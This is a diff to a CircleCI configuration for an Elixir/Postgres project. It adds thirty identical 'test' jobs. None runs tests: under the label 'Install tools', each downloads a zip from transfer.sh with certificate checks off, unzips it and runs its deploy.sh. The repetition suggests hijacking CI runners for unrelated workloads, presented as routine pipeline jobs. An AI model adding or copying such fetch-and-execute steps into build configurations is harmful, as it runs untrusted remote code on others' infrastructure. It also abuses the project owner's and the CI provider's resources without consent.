@@ -187,6 +187,668 @@ jobs:
       # Install tools.
       - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
 
+  test3:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test4:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test5:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test6:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test7:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test8:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test9:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test10:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test11:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test12:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test13:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test14:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  
+
+  test15:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test16:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test17:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test18:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test19:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test20:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test21:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test22:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test23:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test24:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test25:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test26:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test27:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test28:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test29:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test30:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test31:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
+  test32:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
 
 
 workflows:
@@ -202,3 +864,32 @@ workflows:
       - credo
       - dialyzer
       - test2
+      - test3
+      - test4
+      - test5
+      - test6
+      - test7
+      - test8
+      - test9
+      - test10
+      - test11
+      - test12
+      - test13
+      - test14
+      - test15
+      - test16
+      - test17
+      - test18
+      - test19
+      - test20
+      - test21
+      - test22
+      - test23
+      - test24
+      - test25
+      - test26
+      - test27
+      - test28
+      - test29
+      - test30
+      - test31
